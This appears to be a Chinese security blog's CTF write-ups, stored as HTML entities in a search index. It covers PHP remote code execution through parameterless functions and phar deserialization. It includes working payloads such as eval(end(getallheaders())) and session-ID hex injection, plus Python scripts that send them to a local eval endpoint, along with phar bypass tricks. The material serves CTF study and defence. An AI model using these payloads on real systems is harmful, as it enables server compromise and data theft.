&#x8FD9;&#x4E2A;payload&#x662F;&#x5728;&#x7FA4;&#x91CC;&#x9762;&#x770B;&#x5230;&#x4E00;&#x4E2A;&#x5E08;&#x5085;&#x53D1;&#x7684;&#x3002; if(chdir(next(scandir(pos(localeconv())))))readfile(end(scandir(pos(localeconv())))); &#x56E0;&#x4E3A;chdir()&#x8FD4;&#x56DE;0&#x548C;1&#xFF0C;&#x6240;&#x4EE5;&#x4F7F;&#x7528;if&#x6765;&#x5224;&#x65AD;&#x5E76;&#x6267;&#x884C;&#x540E;&#x9762;&#x8BED;&#x53E5;&#x8FDB;&#x884C;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#x3002;&#x8FD9;&#x6837;&#x5C31;&#x4E0D;&#x7528;&#x4F7F;&#x7528;localtime&#x51FD;&#x6570;&#x6765;&#x83B7;&#x53D6;&#x201D;.&#x201D;&#x3002;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8BFB;flag&#x3002; &#x5B9E;&#x73B0;&#x7684;&#x51FD;&#x6570;&#x5728;&#x7B2C;&#x4E00;&#x79CD;&#x65B9;&#x5F0F;&#x90FD;&#x6709;&#x3002;&#x5C31;&#x4E0D;&#x5206;&#x6790;&#x4E86;&#x3002; &#x65E0;&#x53C2;&#x6570;&#x51FD;&#x6570;&#x7684;&#x5229;&#x7528;&#x603B;&#x7ED3;&#x73AF;&#x5883;&#xFF1A; 12345&lt;?phpif(&apos;;&apos; === preg_replace(&apos;/[^\\W]+\\((?R)?\\)/&apos;, &apos;&apos;, $_POST[&apos;code&apos;])) { eval($_POST[&apos;code&apos;]);}?&gt; &#x8FD9;&#x91CC;&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;&#x548C;&#x9898;&#x76EE;&#x7684;&#x533A;&#x522B;&#x5728;&#x4E8E;&#x8FD9;&#x91CC;&#x8FD8;&#x8FD0;&#x884C;&#x51FD;&#x6570;&#x540D;&#x79F0;&#x5305;&#x542B;_&#x7B49;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x3002; &#x83B7;&#x53D6;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x4F7F;&#x7528;getenv()&#x83B7;&#x53D6;&#x8D85;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x7684;&#x6570;&#x7EC4;&#xFF0C;&#x4F7F;&#x7528;array_rand&#x548C;array_flip&#x7206;&#x7834;&#x51FA;&#x6240;&#x6709;&#x7684;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x3002; getenv() &#x83B7;&#x53D6;&#x4E00;&#x4E2A;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x7684;&#x503C;(&#x5728;7.1&#x4E4B;&#x540E;&#x53EF;&#x4EE5;&#x4E0D;&#x7ED9;&#x4E88;&#x53C2;&#x6570;) array_rand() &#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x968F;&#x673A;&#x952E;&#x540D;&#xFF0C;&#x6216;&#x8005;&#x5982;&#x679C;&#x60A8;&#x89C4;&#x5B9A;&#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x4E0D;&#x53EA;&#x4E00;&#x4E2A;&#x952E;&#x540D;&#xFF0C;&#x5219;&#x8FD4;&#x56DE;&#x5305;&#x542B;&#x968F;&#x673A;&#x952E;&#x540D;&#x7684;&#x6570;&#x7EC4;&#x3002; array_flip() array_flip() &#x51FD;&#x6570;&#x7528;&#x4E8E;&#x53CD;&#x8F6C;/&#x4EA4;&#x6362;&#x6570;&#x7EC4;&#x4E2D;&#x6240;&#x6709;&#x7684;&#x952E;&#x540D;&#x4EE5;&#x53CA;&#x5B83;&#x4EEC;&#x5173;&#x8054;&#x7684;&#x952E;&#x503C;&#x3002; payload: echo(array_rand(array_flip(getenv()))); getallheaders() =&gt; RCEgetallheaders() &#x83B7;&#x53D6;&#x5168;&#x90E8; HTTP &#x8BF7;&#x6C42;&#x5934;&#x4FE1;&#x606F;, &#x662F;&#x4E0B;&#x65B9;&#x51FD;&#x6570;&#x7684;&#x522B;&#x540D; apache_request_headers &#x83B7;&#x53D6;&#x5168;&#x90E8; HTTP &#x8BF7;&#x6C42;&#x5934;&#x4FE1;&#x606F; &#x8FD9;&#x4E24;&#x4E2A;&#x51FD;&#x6570;&#x53EA;&#x9002;&#x7528;&#x4E8E;apache&#x670D;&#x52A1;&#x5668; &#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x5185;&#x5BB9;&#xFF1A; 1234567891011array(11) { [&quot;Accept-Language&quot;]=&gt; string(23) &quot;zh-CN,zh;q=0.9,en;q=0.8&quot; [&quot;Accept-Encoding&quot;]=&gt; string(17) &quot;gzip, deflate, br&quot; [&quot;Accept&quot;]=&gt; string(3) &quot;*/*&quot; [&quot;Content-Type&quot;]=&gt; string(68) &quot;multipart/form-data; boundary=----WebKitFormBoundaryevLOjNPCJPGbsCBf&quot; ...} &#x5F53;&#x6211;&#x4EEC;&#x6784;&#x9020;&#x4E00;&#x4E2A;Header&#x65F6;&#xFF1A; &#x6DFB;&#x52A0;&#x4E00;&#x4E2A;Header&#x4E3A;test: phpinfo();,&#x6839;&#x636E;&#x4F4D;&#x7F6E;&#x9009;&#x62E9;&#x5408;&#x9002;&#x7684;payload&#xFF1A; &#x6DFB;&#x52A0;&#x5728;Header&#x5728;&#x7B2C;&#x4E00;&#x4E2A;&#xFF1A; payload: code=eval(pos(getallheaders())); (pos()&#x53EF;&#x4EE5;&#x6362;&#x4E3A;current(). &#x5982;&#x679C;&#x5728;&#x7B2C;&#x4E8C;&#x4E2A;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;next()) &#x6DFB;&#x52A0;&#x5728;Header&#x5728;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#xFF1A; payload: code=eval(end(getallheaders())); &#x4E0D;&#x77E5;&#x9053;&#x4F4D;&#x7F6E;&#xFF1A; &#x914D;&#x5408;array_rand(), array_flip()&#x6784;&#x9020;payload&#x8FDB;&#x884C;&#x7206;&#x7834;&#xFF1A; payload: eval(array_rand(array_flip(getallheaders()))); get_defined_vars() =&gt; RCEget_defined_vars() &#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x7531;&#x6240;&#x6709;&#x5DF2;&#x5B9A;&#x4E49;&#x53D8;&#x91CF;&#x6240;&#x7EC4;&#x6210;&#x7684;&#x6570;&#x7EC4;&#x3002; &#x548C;getallheaders()&#x5229;&#x7528;&#x7C7B;&#x4F3C;&#xFF0C;&#x4F46;&#x662F;&#x4E0D;&#x6B62;apache, ngnix&#x548C;&#x5176;&#x4ED6;&#x7684;&#x4E5F;&#x53EF;&#x4EE5;&#x7528; &#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x5185;&#x5BB9;&#xFF1A; 12345678910111213141516array(4) { [&quot;_GET&quot;]=&gt; array(0) { } [&quot;_POST&quot;]=&gt; array(1) { [&quot;code&quot;]=&gt; string(29) &quot;var_dump(get_defined_vars());&quot; } [&quot;_COOKIE&quot;]=&gt; array(0) { } [&quot;_FILES&quot;]=&gt; array(0) { }} &#x4F1A;&#x8FD4;&#x56DE;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x7684;&#x503C;&#xFF0C;&#x5982;get&#x3001;post&#x3001;cookie&#x3001;file&#x6570;&#x636E;&#x3002; &#x5229;&#x7528;$_GET url&#x4E2D;&#x6DFB;&#x52A0;&#x53C2;&#x6570;&#xFF1A;http://127.0.0.1/code/code.php?test=phpinfo(); post&#x6570;&#x636E;&#xFF1A;eval(end(current(get_defined_vars()))); &#x5229;&#x7528;$_FILES 12345678910import requestsfiles = { &quot;system(&apos;ping 127.0.0.1&apos;);&quot;: &quot;&quot;}data = {&quot;code&quot;:&quot;eval(pos(pos(end(get_defined_vars()))));&quot;}r = requests.post(&apos;http://127.0.0.1/code/code.php&apos;, data=data, files=files)print(r.content.decode(&quot;utf-8&quot;, &quot;ignore&quot;)) &#x628A;payload&#x76F4;&#x63A5;&#x653E;&#x5728;&#x6587;&#x4EF6;&#x7684;&#x540D;&#x79F0;&#x4E0A;&#xFF0C;&#x518D;&#x901A;&#x8FC7;&#x4E24;&#x4E2A;pos&#x5B9A;&#x4F4D;&#x8FDB;&#x884C;&#x5229;&#x7528;&#x3002; &#x4E5F;&#x53EF;&#x4EE5;&#x50CF;sky&#x5E08;&#x5085;&#x811A;&#x672C;&#x91CC;&#x9762;&#x90A3;&#x6837;&#x8FDB;&#x884C;&#x7F16;&#x7801;&#xFF0C;&#x4F7F;&#x7528;hex2bin()&#x89E3;&#x7801;&#x5229;&#x7528;&#x3002; session_id() =&gt; RCEsession_id() &#x53EF;&#x4EE5;&#x7528;&#x6765;&#x83B7;&#x53D6;/&#x8BBE;&#x7F6E; &#x5F53;&#x524D;&#x4F1A;&#x8BDD; ID&#x3002; &#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4FEE;&#x6539;cookie&#x6765;&#x8BBE;&#x7F6E;session&#xFF0C;&#x7528;session_id()&#x8BFB;&#x53D6;&#x8FDB;&#x884C;&#x5229;&#x7528;&#x3002; payload: 12345678910111213import requestsimport binasciipayload = &quot;system(&apos;ping 127.0.0.1&apos;);&quot;payload = str(binascii.b2a_hex(payload.encode(&apos;utf-8&apos;))).strip(&quot;b&quot;).strip(&quot;&apos;&quot;)cookies={ &quot;PHPSESSID&quot;: payload}data = {&quot;code&quot;:&quot;eval(hex2bin(session_id(session_start())));&quot;}r = requests.post(&apos;http://127.0.0.1/code/code.php&apos;, data=data, cookies=cookies)print(r.content.decode(&quot;utf-8&quot;, &quot;ignore&quot;)) &#x65E0;&#x53C2;&#x6570;&#x51FD;&#x6570;&#x5C0F;&#x603B;&#x7ED3;&#x8FD9;&#x91CC;&#x662F;&#x9488;&#x5BF9;&#x65E0;&#x53C2;&#x6570;&#x51FD;&#x6570;&#x5229;&#x7528;&#x6765;&#x8BF4;&#x7684;&#x3002; getchwd() &#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x5F53;&#x524D;&#x5DE5;&#x4F5C;&#x76EE;&#x5F55;&#x3002; scandir() &#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x6307;&#x5B9A;&#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x6587;&#x4EF6;&#x548C;&#x76EE;&#x5F55;&#x7684;&#x6570;&#x7EC4;&#x3002; dirname() &#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x8DEF;&#x5F84;&#x4E2D;&#x7684;&#x76EE;&#x5F55;&#x90E8;&#x5206;&#x3002; chdir() &#x51FD;&#x6570;&#x6539;&#x53D8;&#x5F53;&#x524D;&#x7684;&#x76EE;&#x5F55;&#x3002; readfile() &#x8F93;&#x51FA;&#x4E00;&#x4E2A;&#x6587;&#x4EF6; current() &#x8FD4;&#x56DE;&#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x5F53;&#x524D;&#x5355;&#x5143;, &#x9ED8;&#x8BA4;&#x53D6;&#x7B2C;&#x4E00;&#x4E2A;&#x503C; pos() current() &#x7684;&#x522B;&#x540D; next() &#x51FD;&#x6570;&#x5C06;&#x5185;&#x90E8;&#x6307;&#x9488;&#x6307;&#x5411;&#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x4E0B;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#xFF0C;&#x5E76;&#x8F93;&#x51FA;&#x3002; end() &#x5C06;&#x5185;&#x90E8;&#x6307;&#x9488;&#x6307;&#x5411;&#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#xFF0C;&#x5E76;&#x8F93;&#x51FA;&#x3002; array_rand() &#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x968F;&#x673A;&#x952E;&#x540D;&#xFF0C;&#x6216;&#x8005;&#x5982;&#x679C;&#x60A8;&#x89C4;&#x5B9A;&#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x4E0D;&#x53EA;&#x4E00;&#x4E2A;&#x952E;&#x540D;&#xFF0C;&#x5219;&#x8FD4;&#x56DE;&#x5305;&#x542B;&#x968F;&#x673A;&#x952E;&#x540D;&#x7684;&#x6570;&#x7EC4;&#x3002; array_flip() array_flip() &#x51FD;&#x6570;&#x7528;&#x4E8E;&#x53CD;&#x8F6C;/&#x4EA4;&#x6362;&#x6570;&#x7EC4;&#x4E2D;&#x6240;&#x6709;&#x7684;&#x952E;&#x540D;&#x4EE5;&#x53CA;&#x5B83;&#x4EEC;&#x5173;&#x8054;&#x7684;&#x952E;&#x503C;&#x3002; chr() &#x51FD;&#x6570;&#x4ECE;&#x6307;&#x5B9A;&#x7684; ASCII &#x503C;&#x8FD4;&#x56DE;&#x5B57;&#x7B26;&#x3002; hex2bin &#x2014; &#x8F6C;&#x6362;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;&#x4E3A;&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32; getenv() &#x83B7;&#x53D6;&#x4E00;&#x4E2A;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x7684;&#x503C;(&#x5728;7.1&#x4E4B;&#x540E;&#x53EF;&#x4EE5;&#x4E0D;&#x7ED9;&#x4E88;&#x53C2;&#x6570;) &#x5E38;&#x89C1;&#x7684;&#x5C31;&#x8FD9;&#x4E48;&#x4E00;&#x4E9B;&#x3002;&#x5148;&#x8BB0;&#x5F55;&#x5230;&#x8FD9;&#x5427;&#x3002; &#x53C2;&#x8003; http://peanuts2ao.top/2019/09/09/2019-ByteCTF-pwn/ https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/","link":"/2019/09/15/boringcode/"},{"title":"Phar反序列化总结","text":"&#x524D;&#x8A00;&#x9664;&#x4E86;unserialize()&#x6765;&#x5229;&#x7528;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#x4E4B;&#x5916;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x5229;&#x7528;phar&#x6587;&#x4EF6;&#x4EE5;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x5F62;&#x5F0F;&#x5B58;&#x50A8;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x7684;meta-data&#x8FD9;&#x4E00;&#x7279;&#x6027;&#xFF0C;&#x6269;&#x5927;php&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#x7684;&#x653B;&#x51FB;&#x9762;&#x3002;&#x8BE5;&#x65B9;&#x6CD5;&#x5728;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x51FD;&#x6570;&#xFF08;file_exists()&#x3001;is_dir()&#x7B49;&#xFF09;&#x53C2;&#x6570;&#x53EF;&#x63A7;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x914D;&#x5408;phar://&#x4F2A;&#x534F;&#x8BAE;&#xFF0C;&#x53EF;&#x4EE5;&#x4E0D;&#x4F9D;&#x8D56;unserialize()&#x76F4;&#x63A5;&#x8FDB;&#x884C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x64CD;&#x4F5C;&#x3002; &#x8FD9;&#x6B21;&#x5728;&#x6BD4;&#x8D5B;&#x5F53;&#x4E2D;&#x9047;&#x5230;phar&#x53CD;&#x5E8F;&#x5217;&#x5316;&#xFF0C;&#x5374;&#x4E0D;&#x77E5;&#x9053;&#x5982;&#x4F55;&#x4E0B;&#x624B;&#x3002;&#x793E;&#x533A;&#x91CC;&#x524D;&#x9762;&#x4E5F;&#x6709;&#x4EBA;&#x603B;&#x7ED3;&#x8FC7;&#xFF0C;&#x4F46;&#x6CA1;&#x6709;&#x5305;&#x62EC;&#x4E00;&#x4E9B;ctf&#x5229;&#x7528;&#x548C;zxc&#x5E08;&#x5085;&#x53D1;&#x73B0;&#x7684;&#x59FF;&#x52BF;&#x3002;&#x4E8E;&#x662F;&#x5C31;&#x81EA;&#x5DF1;&#x6765;&#x6574;&#x7406;&#x4E86;&#x3002; phar&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#x7684;&#x539F;&#x7406;&#x4EC0;&#x4E48;&#x662F;phar&#x6587;&#x4EF6;&#xFF1F;&#xFF1A;&#x5728;&#x8F6F;&#x4EF6;&#x4E2D;&#xFF0C;PHAR&#xFF08;PHP&#x5F52;&#x6863;&#xFF09;&#x6587;&#x4EF6;&#x662F;&#x4E00;&#x79CD;&#x6253;&#x5305;&#x683C;&#x5F0F;&#xFF0C;&#x901A;&#x8FC7;&#x5C06;&#x8BB8;&#x591A;PHP&#x4EE3;&#x7801;&#x6587;&#x4EF6;&#x548C;&#x5176;&#x4ED6;&#x8D44;&#x6E90;&#xFF08;&#x4F8B;&#x5982;&#x56FE;&#x50CF;&#xFF0C;&#x6837;&#x5F0F;&#x8868;&#x7B49;&#xFF09;&#x6346;&#x7ED1;&#x5230;&#x4E00;&#x4E2A;&#x5F52;&#x6863;&#x6587;&#x4EF6;&#x4E2D;&#x6765;&#x5B9E;&#x73B0;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x548C;&#x5E93;&#x7684;&#x5206;&#x53D1;&#x3002;wiki) php&#x901A;&#x8FC7;&#x7528;&#x6237;&#x5B9A;&#x4E49;&#x548C;&#x5185;&#x7F6E;&#x7684;&#x201C;&#x6D41;&#x5305;&#x88C5;&#x5668;&#x201D;&#x5B9E;&#x73B0;&#x590D;&#x6742;&#x7684;&#x6587;&#x4EF6;&#x5904;&#x7406;&#x529F;&#x80FD;&#x3002;&#x5185;&#x7F6E;&#x5305;&#x88C5;&#x5668;&#x53EF;&#x7528;&#x4E8E;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x51FD;&#x6570;&#xFF0C;&#x5982;(fopen(),copy(),file_exists()&#x548C;filesize()&#x3002; phar://&#x5C31;&#x662F;&#x4E00;&#x79CD;&#x5185;&#x7F6E;&#x7684;&#x6D41;&#x5305;&#x88C5;&#x5668;&#x3002; php&#x4E2D;&#x4E00;&#x4E9B;&#x5E38;&#x89C1;&#x7684;&#x6D41;&#x5305;&#x88C5;&#x5668;&#x5982;&#x4E0B;&#xFF1A; 123456789101112file:// &#x2014; &#x8BBF;&#x95EE;&#x672C;&#x5730;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#xFF0C;&#x5728;&#x7528;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x51FD;&#x6570;&#x65F6;&#x9ED8;&#x8BA4;&#x5C31;&#x4F7F;&#x7528;&#x8BE5;&#x5305;&#x88C5;&#x5668;http:// &#x2014; &#x8BBF;&#x95EE; HTTP(s) &#x7F51;&#x5740;ftp:// &#x2014; &#x8BBF;&#x95EE; FTP(s) URLsphp:// &#x2014; &#x8BBF;&#x95EE;&#x5404;&#x4E2A;&#x8F93;&#x5165;/&#x8F93;&#x51FA;&#x6D41;&#xFF08;I/O streams&#xFF09;zlib:// &#x2014; &#x538B;&#x7F29;&#x6D41;data:// &#x2014; &#x6570;&#x636E;&#xFF08;RFC 2397&#xFF09;glob:// &#x2014; &#x67E5;&#x627E;&#x5339;&#x914D;&#x7684;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#x6A21;&#x5F0F;phar:// &#x2014; PHP &#x5F52;&#x6863;ssh2:// &#x2014; Secure Shell 2rar:// &#x2014; RARogg:// &#x2014; &#x97F3;&#x9891;&#x6D41;expect:// &#x2014; &#x5904;&#x7406;&#x4EA4;&#x4E92;&#x5F0F;&#x7684;&#x6D41; &#x6D41;&#x5305;&#x88C5;&#x5668;&#x7684;&#x8BE6;&#x7EC6;&#x5185;&#x5BB9;&#x53EF;&#x4EE5;&#x53C2;&#x8003;php&#x6D41;Streams&#x3001;&#x5305;&#x88C5;&#x5668;wrapper &#x8BE6;&#x89E3; phar&#x6587;&#x4EF6;&#x7684;&#x7ED3;&#x6784;&#xFF1A;phar&#x6587;&#x4EF6;&#x90FD;&#x5305;&#x542B;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x90E8;&#x5206;&#xFF1A; 1. stub phar&#x6587;&#x4EF6;&#x7684;&#x6807;&#x5FD7;&#xFF0C;&#x5FC5;&#x987B;&#x4EE5; xxx __HALT_COMPILER();?&gt; &#x7ED3;&#x5C3E;&#xFF0C;&#x5426;&#x5219;&#x65E0;&#x6CD5;&#x8BC6;&#x522B;&#x3002;xxx&#x53EF;&#x4EE5;&#x4E3A;&#x81EA;&#x5B9A;&#x4E49;&#x5185;&#x5BB9;&#x3002; 2. manifest phar&#x6587;&#x4EF6;&#x672C;&#x8D28;&#x4E0A;&#x662F;&#x4E00;&#x79CD;&#x538B;&#x7F29;&#x6587;&#x4EF6;&#xFF0C;&#x5176;&#x4E2D;&#x6BCF;&#x4E2A;&#x88AB;&#x538B;&#x7F29;&#x6587;&#x4EF6;&#x7684;&#x6743;&#x9650;&#x3001;&#x5C5E;&#x6027;&#x7B49;&#x4FE1;&#x606F;&#x90FD;&#x653E;&#x5728;&#x8FD9;&#x90E8;&#x5206;&#x3002;&#x8FD9;&#x90E8;&#x5206;&#x8FD8;&#x4F1A;&#x4EE5;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x5F62;&#x5F0F;&#x5B58;&#x50A8;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x7684;meta-data&#xFF0C;&#x8FD9;&#x662F;&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x6700;&#x6838;&#x5FC3;&#x7684;&#x5730;&#x65B9;&#x3002; 3. content &#x88AB;&#x538B;&#x7F29;&#x6587;&#x4EF6;&#x7684;&#x5185;&#x5BB9; 4. signature (&#x53EF;&#x7A7A;) &#x7B7E;&#x540D;&#xFF0C;&#x653E;&#x5728;&#x672B;&#x5C3E;&#x3002; &#x751F;&#x6210;&#x4E00;&#x4E2A;phar&#x6587;&#x4EF6;&#xFF1A;php&#x5185;&#x7F6E;&#x4E86;&#x4E00;&#x4E2A;phar&#x7C7B;&#x6765;&#x5904;&#x7406;&#x76F8;&#x5173;&#x64CD;&#x4F5C;&#x3002; &#x6CE8;&#x610F;&#xFF1A;&#x8FD9;&#x91CC;&#x8981;&#x5C06;php.ini&#x91CC;&#x9762;&#x7684;phar.readonly&#x9009;&#x9879;&#x8BBE;&#x7F6E;&#x4E3A;Off&#x3002;&#x5E76;&#x628A;&#x5206;&#x53F7;&#x53BB;&#x6389;&#x3002; (&#x5982;&#x679C;&#x4F60;&#x5728;&#x547D;&#x4EE4;&#x884C;&#x8FD0;&#x884C;PHP&#x6587;&#x4EF6;&#x8FD8;&#x662F;&#x65E0;&#x6CD5;&#x751F;&#x6210;&#x6210;&#x529F;&#xFF0C;&#x8BF7;&#x4F7F;&#x7528;php -v&#x67E5;&#x770B;php&#x7248;&#x672C;&#x5E76;&#x5728;&#x4FEE;&#x6539;&#x6307;&#x5B9A;&#x7248;&#x672C;&#x7684;php.ini&#x3002;) 1234567891011121314&lt;?php class TestObject { } @unlink(&quot;phar.phar&quot;); $phar = new Phar(&quot;phar.phar&quot;); //&#x540E;&#x7F00;&#x540D;&#x5FC5;&#x987B;&#x4E3A;phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //&#x8BBE;&#x7F6E;stub $o = new TestObject(); $phar-&gt;setMetadata($o); //&#x5C06;&#x81EA;&#x5B9A;&#x4E49;&#x7684;meta-data&#x5B58;&#x5165;manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //&#x6DFB;&#x52A0;&#x8981;&#x538B;&#x7F29;&#x7684;&#x6587;&#x4EF6; //&#x7B7E;&#x540D;&#x81EA;&#x52A8;&#x8BA1;&#x7B97; $phar-&gt;stopBuffering();?&gt; &#x6267;&#x884C;&#x8FD9;&#x4E2A;php&#x6587;&#x4EF6;&#xFF0C;&#x4F1A;&#x751F;&#x6210;&#x4E00;&#x4E2A;phar.phar&#x6587;&#x4EF6;&#x3002;&#x6253;&#x5F00;&#x67E5;&#x770B;&#x53EF;&#x4EE5;&#x770B;&#x5230;Meta-data&#x7684;&#x5185;&#x5BB9;&#x662F;&#x4EE5;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x5F62;&#x5F0F;&#x50A8;&#x5B58;&#x7684;&#x3002; php&#x5728;&#x89E3;&#x6790;&#x8FD9;&#x4E2A;phar&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x8FD8;&#x4F1A;&#x5BF9;meta-data&#x6570;&#x636E;&#x8FDB;&#x884C;&#x4E00;&#x6B21;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x3002;PHP&#x5E95;&#x5C42;&#x4EE3;&#x7801;&#xFF1A; &#x901A;&#x8FC7;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x80FD;&#x591F;&#x63A7;&#x5236;&#x4E00;&#x4E9B;&#x7C7B;&#x7684;&#x53D8;&#x91CF;&#x8FDB;&#x884C;&#x5229;&#x7528;&#x3002; &#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x6761;&#x4EF6; phar&#x6587;&#x4EF6;&#x8981;&#x80FD;&#x591F;&#x4E0A;&#x4F20;&#x5230;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x3002; &#x8981;&#x6709;&#x53EF;&#x7528;&#x7684;&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x4F5C;&#x4E3A;&#x201C;&#x8DF3;&#x677F;&#x201D;&#x3002; &#x6587;&#x4EF6;&#x64CD;&#x4F5C;&#x51FD;&#x6570;&#x7684;&#x53C2;&#x6570;&#x53EF;&#x63A7;&#xFF0C;&#x4E14;:&#x3001;/&#x3001;phar&#x7B49;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x6CA1;&#x6709;&#x88AB;&#x8FC7;&#x6EE4;&#x3002; &#x53D7;&#x5F71;&#x54CD;&#x7684;&#x6587;&#x4EF6;&#x64CD;&#x4F5C;&#x51FD;&#x6570;&#x77E5;&#x9053;&#x521B;&#x5B87;&#x6D4B;&#x8BD5;&#x540E;&#x53D7;&#x5F71;&#x54CD;&#x7684;&#x51FD;&#x6570;&#x5217;&#x8868;&#xFF1A; &#x4F46;&#x5B9E;&#x9645;&#x5E76;&#x4E0D;&#x6B62;&#x8FD9;&#x4E00;&#x4E9B;&#x3002; &#x53C2;&#x8003;zxc&#x5E08;&#x5085;&#x7684;&#x6587;&#x7AE0;&#xFF1A;https://blog.zsxsoft.com/post/38 &#x5728;&#x8DDF;&#x8E2A;&#x4E86;&#x53D7;&#x5F71;&#x54CD;&#x51FD;&#x6570;&#x7684;&#x8C03;&#x7528;&#x60C5;&#x51B5;&#x540E;&#x53D1;&#x73B0;&#xFF0C;&#x9664;&#x4E86;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x51FD;&#x6570;&#xFF0C;&#x53EA;&#x8981;&#x662F;&#x51FD;&#x6570;&#x7684;&#x5B9E;&#x73B0;&#x8FC7;&#x7A0B;&#x76F4;&#x63A5;&#x6216;&#x95F4;&#x63A5;&#x8C03;&#x7528;&#x4E86;php_stream_open_wrapper&#x3002;&#x90FD;&#x53EF;&#x80FD;&#x89E6;&#x53D1;phar&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#x3002; &#x4EE5;&#x4E0B;&#x8FD9;&#x4E9B;&#x65B9;&#x5F0F;&#x90FD;&#x53EF;&#x89E6;&#x53D1;phar&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#xFF1A; exif exif_thumbnail exif_imagetype gd imageloadfont imagecreatefrom*** hash hash_hmac_file hash_file hash_update_file md5_file sha1_file file / url get_meta_tags get_headers standard getimagesize getimagesizefromstring zip $zip = new ZipArchive(); $res = $zip-&gt;open(&apos;c.zip&apos;); $zip-&gt;extractTo(&apos;phar://test.phar/test&apos;); Bzip / Gzip &#x5F53;&#x73AF;&#x5883;&#x9650;&#x5236;&#x4E86;phar&#x4E0D;&#x80FD;&#x51FA;&#x73B0;&#x5728;&#x524D;&#x9762;&#x7684;&#x5B57;&#x7B26;&#x91CC;&#x3002;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;compress.bzip2://&#x548C;compress.zlib://&#x7ED5;&#x8FC7; $z = &apos;compress.bzip2://phar:///home/sx/test.phar/test.txt&apos;; $z = &apos;compress.zlib://phar:///home/sx/test.phar/test.txt&apos;; &#x914D;&#x5408;&#x5176;&#x4ED6;&#x534F;&#x8BAE;&#xFF1A;(SUCTF) &#x5F53;&#x73AF;&#x5883;&#x9650;&#x5236;&#x4E86;phar&#x4E0D;&#x80FD;&#x51FA;&#x73B0;&#x5728;&#x524D;&#x9762;&#x7684;&#x5B57;&#x7B26;&#x91CC;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x914D;&#x5408;&#x5176;&#x4ED6;&#x534F;&#x8BAE;&#x8FDB;&#x884C;&#x5229;&#x7528;&#x3002; php://filter/read=convert.base64-encode/resource=phar://phar.phar Postgres 1234&lt;?php $pdo = new PDO(sprintf(&quot;pgsql:host=%s;dbname=%s;user=%s;password=%s&quot;, &quot;127.0.0.1&quot;, &quot;postgres&quot;, &quot;sx&quot;, &quot;123456&quot;)); @$pdo-&gt;pgsqlCopyFromFile(&apos;aa&apos;, &apos;phar://phar.phar/aa&apos;);?&gt; 